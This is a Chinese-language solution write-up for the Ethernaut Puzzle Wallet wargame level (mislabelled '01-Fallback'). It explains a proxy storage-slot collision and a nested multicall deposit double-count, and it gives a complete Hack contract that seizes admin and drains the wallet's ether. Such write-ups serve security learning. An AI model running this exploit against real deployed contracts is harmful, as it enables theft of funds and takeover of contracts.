# Ethernaut 01-Fallback

## 本关目标

- 成为 proxy 的 admain

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {

    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    // 只有admain可以修改admain
    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance; // 这个slot和proxy合约中的admin是对应的，所以修改这个值就会修改admain
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    // 这里可以修改设置maxBalance, 前提是调用者在白名单并且当前合约的余额为0
    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    // 添加某个地址到白名单
    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    // 取出余额
    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    // 根据传入的data selector delegatecall
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector; // data是selector数组
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
```

## 解决方案

1. 代理合约 admain 对应执行合约的 maxBalance，因此修改执行合约的 maxBalance 即可修改 admain
2. 只能通过调用 setMaxBalance 修改 maxBalance，条件是要在白名单，并且当前合约余额为 0
3. 加入 Hack 合约地址到白名单，需要调用 addToWhitelist，条件是 Hack 合约要是 owner
4. owner 的值对应代理合约的 pendingAdmin，因此需要调用代理合约的 proposeNewAdmin 传入 Hack 合约地址
5. 清零执行合约的余额

- 可以调用 execute, 前提是 balances[msg.sender] >= value
- 因此需要调用 deposit(),更新 balances[msg.sender]，但是永远取不出大于自己存的金额
- 寻找 multicall 的 bug
  - data 可以是执行合约中的任意函数选择器组成的数组
  - data[0]调用 deposit 选择器
  - data[1]调用 multicall 选择器，携带 deposit 选择器数组，这样第二次调用 muticall 时 depositCalled 局部变量又被初始化为 false,可以再次调用 deposit
  - 等效于转一次帐记录了两次

6. multicall 调用携带执行合约的 ether 即可
7. 调用 execute 取出全部余额
8. 调用 setMaxBalance 修改 admain

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Puzzle{
    function admin() external view returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack{
    Puzzle private puzzle;

    constructor(address _target) {
        puzzle = Puzzle(_target);

    }

    function hack() external payable{
        puzzle.proposeNewAdmin(address(this)); // 修改owner
        puzzle.addToWhitelist(address(this)); // 加入白名单

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSelector(puzzle.deposit.selector);  // deposit选择器

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        data[1] = abi.encodeWithSelector(puzzle.multicall.selector, deposit_data); // multicall选择器

        puzzle.multicall{value: msg.value}(data);

        puzzle.execute(msg.sender, 0.002 ether, ""); // 清零余额

        puzzle.setMaxBalance(uint256(uint160(msg.sender))); // 修改admain

    }
}
```
